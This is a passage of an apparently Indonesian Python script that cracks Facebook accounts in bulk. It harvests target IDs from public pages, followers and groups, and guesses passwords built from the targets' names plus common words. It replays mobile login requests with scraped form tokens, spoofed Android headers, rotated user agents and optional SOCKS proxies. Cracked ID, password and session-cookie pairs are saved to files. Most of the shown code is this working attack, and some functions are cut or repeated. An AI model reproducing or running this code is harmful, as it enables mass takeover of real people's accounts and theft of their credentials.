...
║╚╝║╔═╗║║─║║╠╝╚╝║╔═╗║║║──╔╣╠╣║║╚╣╔═╗║║─║║║╚╩═║
╚══╩╝─╚╩╝─╚═╩═══╩╝─╚╝╚╝──╚══╩╝╚═╩╝─╚╩╝─╚═╩═══╝                                                                                
{x}[{b}RICODEX ANGITA RAHMADANI CUAKSS{x}] ''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(id):
	...
	cetak(nel('\tMAU SAMPAI KAPAN KAMU MALING 🤭'))
	print(f'[√] Your Id : {id}')
	print(f'[√] Your Ip : {ip}')
	print('')
	print('[1] Zracx Publik/masal ')
	print('[2] Zracx Follower ')
	print('[3] Zracx Group   ')
	print('[4] Zracx File	')
	print('[5] Check  ')
	print('[0] Exit       ')
...
def passwrd():
	...
	print(f'{m}[°]{x} Mainkan Mode Pesawat Di {m}500{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayank','sayang123','memekk']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
			...
			if 'reguler' in method:
				...
				pool.submit(crackfree,idf,pwv)
			elif 'cuakss' in method:
				pool.submit(crackcuakss,idf,pwv)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rAngita V1{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
			...
			if "c_user" in po.cookies.get_dict().keys():
				...
				print(f'\r[{k}√{x}] {h}{idf}|{pw}{b}{kukis}\n{m}{ua}{P} ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r[{h}X{x}] {k}{idf}|{pw}\n{ua}{P} ')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rAngita V2{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DLTVIU1phR2tTdlNaOW44akUwSldiZyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3D2t7drcvjTLu4h9VqpEoXlg.1697461044203.8782cb8d5e533ee3bdad559e6fef7c68%26_x_zm_rhtaid%3D104%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df158022f-fb08-4a12-b3dc-00f1a1f24b78%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DLTVIU1phR2tTdlNaOW44akUwSldiZyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v8.0/dialog/oauth?response_type=code&client_id=113289095462482&scope=email%2Cpublic_profile&redirect_uri=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth&state=LTVIU1phR2tTdlNaOW44akUwSldiZyxmYWNlYm9va19zaWduaW4&_x_zm_rtaid=2t7drcvjTLu4h9VqpEoXlg.1697461044203.8782cb8d5e533ee3bdad559e6fef7c68&_x_zm_rhtaid=104&ret=login&fbapp_pres=0&logger_id=f158022f-fb08-4a12-b3dc-00f1a1f24b78&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="111"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DLTVIU1phR2tTdlNaOW44akUwSldiZyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3D2t7drcvjTLu4h9VqpEoXlg.1697461044203.8782cb8d5e533ee3bdad559e6fef7c68%26_x_zm_rhtaid%3D104%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df158022f-fb08-4a12-b3dc-00f1a1f24b78%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DLTVIU1phR2tTdlNaOW44akUwSldiZyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {k}{idf}|{k}{pw}|{ua}{P} ')
				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')			
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rAngita V3{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
#----------------------[ METHODE-CUAKSS ]-----------------#
def crackcuakss(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rAngita V4{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=1036673946917037&kid_directed_site=0&app_id=1036673946917037&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1036673946917037%26scope%3Demail%2Bpublic_profile%26state%3D8IGcwoJf6HvsEEnjQhIuWJ1C3A5hvSDqb_v5p91zhFc%253D%26redirect_uri%3Dhttps%253A%252F%252Fapi.uni-app.com%252Foauth2%252Fcallback%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5f82d82a-7fd8-4659-86b4-9b48ac5e9d31%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.uni-app.com%2Foauth2%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D8IGcwoJf6HvsEEnjQhIuWJ1C3A5hvSDqb_v5p91zhFc%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v3.2/dialog/oauth?response_type=code&client_id=1036673946917037&scope=email+public_profile&state=8IGcwoJf6HvsEEnjQhIuWJ1C3A5hvSDqb_v5p91zhFc%3D&redirect_uri=https%3A%2F%2Fapi.uni-app.com%2Foauth2%2Fcallback%2Ffacebook&ret=login&fbapp_pres=0&logger_id=5f82d82a-7fd8-4659-86b4-9b48ac5e9d31&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=1036673946917037&kid_directed_site=0&app_id=1036673946917037&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1036673946917037%26scope%3Demail%2Bpublic_profile%26state%3D8IGcwoJf6HvsEEnjQhIuWJ1C3A5hvSDqb_v5p91zhFc%253D%26redirect_uri%3Dhttps%253A%252F%252Fapi.uni-app.com%252Foauth2%252Fcallback%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5f82d82a-7fd8-4659-86b4-9b48ac5e9d31%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.uni-app.com%2Foauth2%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D8IGcwoJf6HvsEEnjQhIuWJ1C3A5hvSDqb_v5p91zhFc%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
...
def crackmobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rAngita V5{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
